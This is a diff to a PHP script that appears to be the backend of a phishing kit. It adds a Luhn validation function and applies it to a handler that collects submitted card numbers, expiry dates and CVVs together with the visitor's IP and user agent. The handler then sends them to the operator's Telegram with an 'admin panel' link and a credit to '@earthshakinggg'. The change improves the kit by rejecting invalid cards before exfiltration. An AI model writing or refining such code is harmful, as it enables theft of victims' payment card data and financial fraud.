@@ -151,11 +151,36 @@ function getUserAgent() {
     return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
 }
 
+function passesLuhn($cardNumber) {
+    if (!preg_match('/^\d{13,19}$/', $cardNumber)) {
+        return false;
+    }
+
+    $sum = 0;
+    $shouldDouble = false;
+
+    for ($i = strlen($cardNumber) - 1; $i >= 0; $i--) {
+        $digit = (int) $cardNumber[$i];
+
+        if ($shouldDouble) {
+            $digit *= 2;
+            if ($digit > 9) {
+                $digit -= 9;
+            }
+        }
+
+        $sum += $digit;
+        $shouldDouble = !$shouldDouble;
+    }
+
+    return ($sum % 10) === 0;
+}
+
 function formatTelegramMessage($type, $data) {
     $ip = getClientIP();
     $user_agent = getUserAgent();
     $timestamp = date('Y-m-d H:i:s');
-    
+
 
     $user_agent_safe = htmlspecialchars(substr($user_agent, 0, 50), ENT_QUOTES, 'UTF-8');
 
@@ -292,14 +317,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         'expiry' => filter_var($_POST['expiry'], FILTER_SANITIZE_STRING),
                         'cvv' => filter_var($_POST['cvv'], FILTER_SANITIZE_STRING)
                     );
-                    $message = formatTelegramMessage('Card', $data);
-                    
-                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
-                    $message .= "\n <b>Admin Panel:</b>\n";
-                    $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
-                    
-                    $telegram_response = $telegram->sendMessage($message);
+                    if (!passesLuhn($data['card_number'])) {
+                        $response['status'] = 'error';
+                        $response['message'] = 'Invalid card number provided.';
+                        echo json_encode($response);
+                        exit;
+                    } else {
+                        $message = formatTelegramMessage('Card', $data);
+
+                        $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
+                        $message .= "\n <b>Admin Panel:</b>\n";
+                        $message .= $admin_link . "\n";
+                        $message .= "Don't forget to thank @earthshakinggg <3";
+
+                        $telegram_response = $telegram->sendMessage($message);
+                    }
                     break;
                     
                 case 'code':
